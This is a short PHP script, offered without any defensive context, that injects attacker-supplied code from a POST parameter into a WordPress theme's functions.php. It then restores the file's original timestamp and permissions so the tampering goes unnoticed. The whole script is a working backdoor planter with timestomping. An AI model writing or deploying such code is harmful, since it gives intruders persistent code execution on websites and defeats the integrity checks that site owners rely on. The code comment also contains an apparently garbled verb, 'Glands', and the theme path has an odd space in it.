<?php
// Glands a payload into the theme file, then restores its metadata.
$f = '/var/www/html/wp-content/themes/twenty twentyfour/functions.php';
$m = filemtime($f);
$p = fileperms($f);
file_put_contents($f, $_POST['x'] . file_get_contents($f));
touch($f, $m);
chmod($f, $p);
